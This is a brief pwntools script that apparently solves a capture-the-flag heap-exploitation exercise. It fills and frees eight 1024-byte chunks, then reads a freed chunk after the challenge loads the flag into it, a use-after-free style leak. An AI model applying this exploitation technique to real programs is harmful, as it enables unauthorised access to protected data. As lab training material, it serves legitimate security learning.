from pwn import *

context.arch = 'amd64'
BINARY = "/challenge/toddlerheap_level1.0"
#BINARY = "/challenge/toddlerheap_level1.1"

p = process(BINARY)


for i in range(7):
    p.sendline(f'malloc {i} 1024')


p.sendline(b"malloc 7 1024")

for i in range(8):
    p.sendline(f'free {i}')

p.sendline(b"read_flag")
p.sendline(b"puts 7")
p.clean()